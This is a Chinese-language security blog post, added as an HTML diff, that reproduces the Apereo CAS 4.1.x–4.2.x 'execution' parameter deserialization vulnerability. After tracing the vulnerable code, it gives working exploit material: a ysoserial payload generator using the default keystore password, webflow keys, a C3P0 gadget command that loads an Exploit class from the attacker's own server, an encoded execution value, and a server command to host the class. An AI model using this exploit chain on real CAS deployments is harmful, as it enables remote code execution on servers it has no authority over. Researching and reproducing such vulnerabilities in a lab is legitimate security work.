@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Apereo CAS 4.X execution参数反序列化漏洞一、漏洞简介该攻击媒介特别适用于CAS的所有部署v4.1.x和v4.2.x地方中科院外的开箱默认配置用于管理对象序列化，数据加密和签名部署 二、漏洞影响Apereo CAS 4.1.x - 4.16 Apereo CAS 4.1.7 - 4.2x 三、复现过程在 cas-servlet.xml 中，可以知道对execution参数应该">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Apereo%20CAS/Apereo%20CAS%204.X%20execution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Apereo CAS 4.X execution参数反序列化漏洞一、漏洞简介该攻击媒介特别适用于CAS的所有部署v4.1.x和v4.2.x地方中科院外的开箱默认配置用于管理对象序列化，数据加密和签名部署 二、漏洞影响Apereo CAS 4.1.x - 4.16 Apereo CAS 4.1.7 - 4.2x 三、复现过程在 cas-servlet.xml 中，可以知道对execution参数应该">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.gif">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId36.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId37.gif">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId38.png">
+<meta property="article:published_time" content="2022-07-08T06:25:53.175Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Apereo CAS/Apereo CAS 4.X execution参数反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apereo%20CAS/Apereo%20CAS%204.X%20execution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.175Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apereo-CAS-4-X-execution参数反序列化漏洞"><a href="#Apereo-CAS-4-X-execution参数反序列化漏洞" class="headerlink" title="Apereo CAS 4.X execution参数反序列化漏洞"></a>Apereo CAS 4.X execution参数反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该攻击媒介特别适用于CAS的所有部署v4.1.x和v4.2.x地方中科院外的开箱默认配置用于管理对象序列化，数据加密和签名部署</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apereo CAS 4.1.x - 4.16</p>
+<p>Apereo CAS 4.1.7 - 4.2x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在 cas-servlet.xml 中，可以知道对execution参数应该关注 FlowExecutorImpl</p>
+<pre><code>&lt;bean name=&quot;loginFlowExecutor&quot; class=&quot;org.springframework.webflow.executor.FlowExecutorImpl&quot;
+          c:definitionLocator-ref=&quot;loginFlowRegistry&quot;
+          c:executionFactory-ref=&quot;loginFlowExecutionFactory&quot;
+          c:executionRepository-ref=&quot;loginFlowExecutionRepository&quot;/&gt;
+</code></pre>
+<p>在 org/springframework/webflow/executor/FlowExecutorImpl.class:96</p>
+<pre><code>public FlowExecutionResult resumeExecution(String flowExecutionKey, ExternalContext context) throws FlowException &#123;
+        FlowExecutionResult var6;
+        try &#123;
+            ...
+
+            try &#123;
+                FlowExecution flowExecution = this.executionRepository.getFlowExecution(key);
+                ...
+            &#125;
+            ...
+        &#125;
+        ...
+    &#125;
+</code></pre>
+<p>跟进 <code>getFlowExecution</code>，在<br>spring-webflow-client-repo-1.0.0.jar!/org/jasig/spring/webflow/plugin/ClientFlowExecutionRepository.class:51</p>
+<pre><code>public FlowExecution getFlowExecution(FlowExecutionKey key) throws FlowExecutionRepositoryException &#123;
+        ...
+        byte[] encoded = ((ClientFlowExecutionKey)key).getData();
+
+        try &#123;
+            ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)this.transcoder.decode(encoded);
+            ...
+        &#125;        
+    &#125;
+</code></pre>
+<p>跟进 <code>decode</code><br>spring-webflow-client-repo-1.0.0.jar!/org/jasig/spring/webflow/plugin/EncryptedTranscoder.class:80</p>
+<pre><code>public Object decode(byte[] encoded) throws IOException &#123;
+        byte[] data;
+        try &#123;
+            data = this.cipherBean.decrypt(encoded);
+        &#125; catch (Exception var11) &#123;
+            throw new IOException(&quot;Decryption error&quot;, var11);
+        &#125;
+
+        ByteArrayInputStream inBuffer = new ByteArrayInputStream(data);
+        ObjectInputStream in = null;
+
+        Object var5;
+        try &#123;
+            if (this.compression) &#123;
+                in = new ObjectInputStream(new GZIPInputStream(inBuffer));
+            &#125; else &#123;
+                in = new ObjectInputStream(inBuffer);
+            &#125;
+
+            var5 = in.readObject();
+        &#125; catch (ClassNotFoundException var10) &#123;
+            throw new IOException(&quot;Deserialization error&quot;, var10);
+        &#125; finally &#123;
+            if (in != null) &#123;
+                in.close();
+            &#125;
+
+        &#125;
+
+        return var5;
+    &#125;
+</code></pre>
+<p>post进入的execution参数值即<code>encoded</code>，在经过<code>decrypt</code>解密后，最终在<code>var5 = in.readObject()</code>触发反序列化漏洞。</p>
+<h3 id="Apereo-CAS-4-1-X-4-1-6-漏洞复现"><a href="#Apereo-CAS-4-1-X-4-1-6-漏洞复现" class="headerlink" title="Apereo CAS 4.1.X ~ 4.1.6 漏洞复现"></a>Apereo CAS 4.1.X ~ 4.1.6 漏洞复现</h3><p>4.1.x 的加密过程直接利用了EncryptedTranscoder中的<code>encode</code></p>
+<pre><code>public class EncryptedTranscoder implements Transcoder &#123;
+    private CipherBean cipherBean;
+    private boolean compression = true;
+
+    public EncryptedTranscoder() throws IOException &#123;
+        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
+        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));
+        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
+        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);
+        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);
+        bufferedBlockCipherBean.setNonce(new RBGNonce());
+        this.setCipherBean(bufferedBlockCipherBean);
+    &#125;
+
+    ...
+    public byte[] encode(Object o) throws IOException &#123;
+        if (o == null) &#123;
+            return new byte[0];
+        &#125; else &#123;
+            ByteArrayOutputStream outBuffer = new ByteArrayOutputStream();
+            ObjectOutputStream out = null;
+
+            try &#123;
+                if (this.compression) &#123;
+                    out = new ObjectOutputStream(new GZIPOutputStream(outBuffer));
+                &#125; else &#123;
+                    out = new ObjectOutputStream(outBuffer);
+                &#125;
+
+                out.writeObject(o);
+            &#125; finally &#123;
+                if (out != null) &#123;
+                    out.close();
+                &#125;
+
+            &#125;
+
+            try &#123;
+                return this.cipherBean.encrypt(outBuffer.toByteArray());
+            &#125; catch (Exception var7) &#123;
+                throw new IOException(&quot;Encryption error&quot;, var7);
+            &#125;
+        &#125;
+    &#125;
+
+    ...
+    protected KeyStore createAndPrepareKeyStore() &#123;
+        KeyStoreFactoryBean ksFactory = new KeyStoreFactoryBean();
+        URL u = this.getClass().getResource(&quot;/etc/keystore.jceks&quot;);
+        ksFactory.setResource(new URLResource(u));
+        ksFactory.setType(&quot;JCEKS&quot;);
+        ksFactory.setPassword(&quot;changeit&quot;);
+        return ksFactory.newInstance();
+    &#125;
+&#125;
+</code></pre>
+<p>同时要注意存在一个base64的过程</p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>因此要生成payload，即先用<code>encode</code>加密后再进行一次base64编码。其中<code>/etc/keystore.jceks</code>在spring-webflow-client-repo-1.0.0.jar/etc/目录下</p>
+<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><pre><code>import org.cryptacular.util.CodecUtil;
+import org.jasig.spring.webflow.plugin.EncryptedTranscoder;
+
+
+import ysoserial.payloads.ObjectPayload;
+
+
+public class ApereoExploit &#123;
+
+
+    public static void main(String[] args) throws Exception&#123;
+        String poc[] = &#123;&quot;CommonsCollections2&quot;,&quot;bash-shell&quot;&#125;;
+        final Object payloadObject = ObjectPayload.Utils.makePayloadObject(poc[0], poc[1]);
+        //AES加密
+        EncryptedTranscoder et = new EncryptedTranscoder();
+        byte[] encode = et.encode(payloadObject);
+        //base64编码
+        System.out.println(CodecUtil.b64(encode));
+    &#125;
+&#125;
+</code></pre>
+<p>运行代码</p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>接着</p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<p>服务器监听：</p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>完整过程动图</p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.gif"></p>
+<h3 id="Apereo-CAS-4-1-7-～-4-2-X-漏洞复现"><a href="#Apereo-CAS-4-1-7-～-4-2-X-漏洞复现" class="headerlink" title="Apereo CAS 4.1.7 ～ 4.2.X 漏洞复现"></a>Apereo CAS 4.1.7 ～ 4.2.X 漏洞复现</h3><p>以4.2.7为例。</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>4.2.x 的<code>decrypt</code>函数在<br>cas-server-webapp-support-4.2.7.jar!/org/jasig/cas/web/flow/CasWebflowCipherBean.class:34</p>
+<pre><code>public byte[] decrypt(byte[] bytes) &#123;
+        return (byte[])this.webflowCipherExecutor.decode(bytes);
+    &#125;
+</code></pre>
+<p>其中<code>decode</code>在<br>cas-server-core-util.jar!/jasig/cas/util/BinaryCipherExecutor.java:82</p>
+<pre><code>@Override
+    public byte[] encode(final byte[] value) &#123;
+        try &#123;
+            final Key key = new SecretKeySpec(this.encryptionSecretKey.getBytes(),
+                    this.secretKeyAlgorithm);
+            final CipherService cipher = new AesCipherService();
+            final byte[] result = cipher.encrypt(value, key.getEncoded()).getBytes();
+            return sign(result);
+        &#125; catch (final Exception e) &#123;
+            logger.error(e.getMessage(), e);
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+
+    @Override
+    public byte[] decode(final byte[] value) &#123;
+        try &#123;
+            final byte[] verifiedValue = verifySignature(value);
+            final Key key = new SecretKeySpec(this.encryptionSecretKey.getBytes(UTF8_ENCODING),
+                    this.secretKeyAlgorithm);
+            final CipherService cipher = new AesCipherService();
+            final byte[] result = cipher.decrypt(verifiedValue, key.getEncoded()).getBytes();
+            return result;
+        &#125; catch (final Exception e) &#123;
+            logger.error(e.getMessage(), e);
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+</code></pre>
+<p>而上面<code>encode</code>其对应的调用加密流程在<br>cas-server-core-util.jar!/org/jasig/cas/util/WebflowCipherExecutor.java:14</p>
+<pre><code>@Component(&quot;webflowCipherExecutor&quot;)
+public class WebflowCipherExecutor extends BinaryCipherExecutor &#123;
+
+    /**
+     * Instantiates a new webflow cipher executor.
+     *
+     * @param secretKeyEncryption the secret key encryption
+     * @param secretKeySigning    the secret key signing
+     * @param secretKeyAlg        the secret key alg
+     */
+    @Autowired
+    public WebflowCipherExecutor(@Value(&quot;$&#123;webflow.encryption.key:&#125;&quot;)
+                                 final String secretKeyEncryption,
+                                 @Value(&quot;$&#123;webflow.signing.key:&#125;&quot;)
+                                 final String secretKeySigning,
+                                 @Value(&quot;$&#123;webflow.secretkey.alg:AES&#125;&quot;)
+                                 final String secretKeyAlg)&#123;
+        super(secretKeyEncryption, secretKeySigning);
+        setSecretKeyAlgorithm(secretKeyAlg);
+    &#125;
+&#125;
+</code></pre>
+<p>因此其加密过程与 4.1.X稍微有些不同，需要重新写加密逻辑。</p>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>利用 cas-overlay-template-4.2<br>，其中在cas-overlay-template-4.2\cas-overlay-template-4.2\src\main\webapp\WEB-INF\spring-configuration\propertyFileConfigurer.xml<br>指定了cas.properties 的位置，最终生成war包，放于Tomcat webapps目录下。</p>
+<p>修改cas.properties，使其支持http，并修改webflow相关默认密钥</p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
+<pre><code>webflow.encryption.key=C4SBogp_badO82wC
+webflow.signing.key=8_G6JMTdkxiJ5rN0tqFrEOQj200VoxGrRzAp7bvjMFSGdA2IOzdFRsGv3m3GMNVmoSJ0O4miIBrYCHx_FWP4oQ
+</code></pre>
+<p>利用 apereocas42.jar 生成加密参数，由于依赖包中存在c3p0</p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
+<p>因此可以利用其做gadget</p>
+<pre><code>java -jar apereocas42.jar C4SBogp_badO82wC  8_G6JMTdkxiJ5rN0tqFrEOQj200VoxGrRzAp7bvjMFSGdA2IOzdFRsGv3m3GMNVmoSJ0O4miIBrYCHx_FWP4oQ  C3P0 http://your_vps:60006/:Exploit
+
+execution=7995ec15-cec8-4eed-9d31-d9a1f7a7138b_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuTVM5aVdUaEtiSE4zVW1KYVZqUXJielZoZFV4V1FWZExUVGRPVUdsblZYVk9hbkZaTUVwdWNUbE1hekpMTVUxeGQyaHVhRkJwY3pacVluZ3ZWVTVNTDBKdVFsUnpkMUIxYW5kVlZUWjRVMDloUlN0SGVUVjZjbXRGYkU5Rk5tNXNUa3R5UVdNMVUwRXpkSFpYYWs4NVpuRjFWUzg0YVZWcmFVaDRUeXRIV1ZFMU5GVXZZV0pSVDJGSmQwaGxkSFZNWlc5VFRsRTNNbE5WSzBjMVFXazFiV2h2V2tWMFVtZEVaVE0zZVhSeldsbDVLMjQwUzJSM1YzSllhemxLV0dRclRuWk5lSE4xZURKM2NIazJRMHBXYkVOS01UVnZURlZEU2tKMU5rMVRaVll3ZVV4VmFHWlBkVzlUZFhCYVpYaFFiV1pwY1hSV1YzVnhMMUIxV0dSWFYxaFhRVGt6ZUZKSGVGcDNTSFZYTkUxRVpVRjFLM1pDU1hWWFQzZG1我是马赛克pT1ZKSVZHNXVUMlpCVFdWdGFGSmFTV0pyWjJWTGJsUnFXVXhVYTA5UUx6QnVLM2xTZVdoQ1NGaDBja3d3VFVab056UTFValJ2VFUwNGNpODRPRXhFVjFKR2VHdEtaSGxNWjFScVdVRnRkMHRIUW00dk5HOHZiR0p0WjBSeVVHdElUbWhIVm1ORVoxSkdlRzlQYm5vMmFXaHVkWEpPVEdaa1kzWXlVMHB3Vm1GSFEwTkZXR3cwZW1Jd1dVSkhjRTlCVUVwUldXZ3ZNRmxaTkVGb09FMXlNRlpGY2t4NFlXUnhTR2QzYmxwSVRVUjFNM2hMT1VOQ2NGRnRWWEo0T1RKRE1ETm1NbmhDTVdwdGRUSktkR3Q1WVc1WmJsZFdVMjlKUm1jMWVERlpXbGg1V1hWclRHZGpXa1Y1VVVOSk5sQlVjM2xXYlc1NlJHUlphbHBMZWpVemRXeHpUVEZtVjNkR1lrOVRRelYwWkROWE9XVkJTM2hPVm5CUE9VOVFRbEJzWVZJd2J5OXFkV1ZrYjNnMmRGZDVWRFEwUlZsVVlXZ3pPVXcwT0ZrclFXNDFlRGcxYUdwNVlXeHVNV3BYVEVSc2MzSnNVRU5MU0ZoV2NYb3JNMmM5UFEuUHlVb1FOdWNYS01Ra1lJZllZQ1FJaXUwQTROUkdzaExCOGMxMHczYzRWRDhHVmI1ZjRMbjZXQllmVUtKVU5FREpwZjl0ckd6N0pQTHJVLXlpMWRSRkE=
+</code></pre>
+<p>在自己的vps上编译Exploit.java，生成Exploit.class</p>
+<pre><code>public class Exploit &#123;
+    public Exploit()&#123;
+        try &#123;
+            java.lang.Runtime.getRuntime().exec(
+                new String[]&#123;&quot;cmd.exe&quot;,&quot;/C&quot;,&quot;calc.exe&quot;&#125;
+       );
+        &#125; catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+    public static void main(String[] argv)&#123;
+        Exploit e = new Exploit();
+    &#125;
+&#125;
+
+// javac Exploit.java 生成Exploit.class
+// python3 -m http.server 60006
+</code></pre>
+<p>截取cas的登录包，替换execution参数</p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId37.gif"></p>
+<p>vps上可以看到c3p0远程加载了class</p>
+<p><img src="/resource/ApereoCAS4.Xexecution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://app.yinxiang.com/fx/83617723-790c-4a9e-b884-f6831e2acf78">https://app.yinxiang.com/fx/83617723-790c-4a9e-b884-f6831e2acf78</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7032/#toc-1">https://xz.aliyun.com/t/7032\#toc-1</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apereo%20CAS/Apereo%20CAS%204.X%20execution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmrp0031y8v1c9ds0djs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/AppWeb/%EF%BC%88CVE-2018-8715%EF%BC%89AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Apache%20Unomi/Apache%20Unomi%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-13942/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
